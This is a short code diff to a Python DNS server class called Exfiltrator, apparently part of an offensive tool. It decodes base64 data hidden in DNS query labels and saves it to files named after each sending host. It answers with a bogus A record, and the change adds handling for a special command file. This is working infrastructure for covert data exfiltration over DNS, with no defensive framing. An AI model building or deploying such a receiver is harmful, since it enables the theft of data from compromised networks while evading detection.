@@ -33,11 +33,15 @@ class Exfiltrator(BaseRequestHandler, object):
 	A Records.
 	Base64 decode message. Save to file. Send bogus response.
 	'''
-	q = name.label
+        rfilename = name.label[1]
         host = self.client_address[0]
+        if rfilename == CMD_FILE:
+            lfilename = CMD_FILE
+        else:
+            lfilename = host + '_' + rfilename
         try:
-            with open(host + '_' + q[1], 'a+b') as f:
-                f.write(base64.b64decode(q[0]))
+            with open(lfilename, 'a+b') as f:
+                f.write(base64.b64decode(name.label[0]))
         except:
             pass
 	return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
